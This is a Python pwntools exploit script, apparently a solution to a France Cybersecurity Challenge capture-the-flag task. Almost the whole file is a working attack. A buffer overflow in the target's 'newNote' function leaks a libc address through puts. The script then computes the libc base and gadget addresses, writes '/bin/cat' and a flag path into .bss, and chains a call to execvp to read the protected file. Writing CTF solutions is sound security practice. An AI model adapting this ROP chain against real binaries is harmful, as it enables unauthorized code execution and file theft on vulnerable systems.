#!/usr/bin/python3.9
from pwn import *

context.terminal = '/usr/bin/kitty'

if not args.BLIND:
    context.binary = elfexe = ELF('./bin') #FIXME
    libc = ELF('./libc') #FIXME

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    elf_path = elfexe.path
    if args.REMOTE:
        remote_server = 'challenges.france-cybersecurity-challenge.fr'   #FIXME
        remote_port = 2110              #FIXME

        if args.SSH:
            s = ssh('app-systeme-ch8', remote_server, remote_port, 'app-systeme-ch8')
            if args.GDB:
                if not args.BLIND:
                    return gdb.debug([elf_path] + argv, gdbscript, elfexe.path, ssh=s, *a, *kw)
                else:
                    return gdb.debug([elf_path] + argv, gdbscript, ssh=s, *a, *kw)
            else:
                target = s.process([elf_path] + argv, *a, **kw)
        else:
            target = remote(remote_server, remote_port)
    else:
        if args.GDB:
            if not args.BLIND:
                return gdb.debug([elf_path] + argv, gdbscript, elfexe.path, *a, *kw)
            else:
                return gdb.debug([elf_path] + argv, gdbscript, *a, *kw)
        else:
            target = process([elf_path] + argv, *a, **kw)
    return target

gdbscript = '''
# init-gef
# target record-full # Not supported with AVX instructions yet

b *newNote+160
# b *main
# command
#     printf "argv ptr: %p\\n",$rsi
# end

# continue
'''.format(**locals())
if args.GDB:
    log.info('Using gdb script:\n'+gdbscript)

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================


arguments = ['50']
r = start(arguments)

data = r.recvuntil(b'ote\n0. Exit\n>>> ')
session = data.decode().split("\n")[0].split(" ")[-1].split("/")[-2]
print("SESSION :", session)


main_ret = 0x401962
ret      = 0x401016
pop_rdi  = 0x40135e
pop_rsp  = 0x401871
pop_rsi  = 0x40135c     # pop rsi; pop r15; ret


#########   ret2main   ###############
r.sendline(b'1')
data = r.recvuntil(b'ontent length: \n')
print(data.decode())
r.sendline(b'152')
data = r.recvuntil(b'Content: \n')
print(data.decode())

payload = b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
payload += p64(0x32)
payload += p64(pop_rdi)
payload += p64(elfexe.got['read'])
payload += p64(elfexe.sym['puts'])
payload += p64(elfexe.sym['newNote'])
#payload += p64(main_ret)

r.sendline(payload)
data = r.recvline()
libc_read = u64(data[:6]+b'\x00\x00')
print("read@libc :", hex(libc_read))
######################################

libc.address = libc_read - libc.sym['read']
print("LIBC Base :", hex(libc.address))


syscall_ret = libc_read+15             # syscall ; cmp rax, -4096 ; ja <...> ; ret
mov_rax     = libc_read+97             # mov rax,[rsp+0x8]; add rsp,0x28; ret
pop_rax     = libc.address+0x3f117
mov_rsp     = libc.address+0x13cd7c    # mov rsi, rsp ; call qword ptr [rax]
pop_rdx     = libc.address+0xfdcfd
pop_rsi     = libc.address+0x28f19
pop_rbx     = libc.address+0x3192d
www         = libc.address+0x3532c     # mov [rdx], rax ; ret


########   BSS Section  ##############
bss = b''
bss += b'/bin/cat'
bss += p64(0x0)
bss += p64(elfexe.bss()+0x80)
bss += p64(elfexe.bss()+0x80+0x28)
bss += p64(0x0)
bss += b'/fcsc/YAu4kj47vbSDkqTEf2YttEcK88pXYpf/4VJuQTSfn5cPdCf8nNhSmn597FDRHXE\x00'
######################################


for i in range(len(bss)):
    #########   Write Struct ##############
    data = r.recvuntil(b'ontent length: \n')
    r.sendline(b'252')
    data = r.recvuntil(b'Content: \n')

    payload = b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
    payload += p64(0x32)
    payload += p64(pop_rdx)
    payload += p64(elfexe.bss()+0x80+i)
    payload += p64(pop_rax)
    payload += p64(bss[i])
    payload += p64(www)
    payload += p64(elfexe.sym['newNote'])

    r.sendline(payload)
    ######################################


#########   Execvp    ##############
data = r.recvuntil(b'ontent length: \n')
print(data.decode())
r.sendline(b'254')
data = r.recvuntil(b'Content: \n')
print(data.decode())

payload = b''
payload += b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
payload += p64(0x32)
payload += p64(pop_rdi)
payload += p64(elfexe.bss()+0x80)
payload += p64(pop_rsi)
payload += p64(elfexe.bss()+0x80+0x10)
payload += p64(ret)
payload += p64(libc.sym['execvp'])
payload += p64(elfexe.sym['newNote'])

r.sendline(payload)
######################################


r.interactive()
r.close()
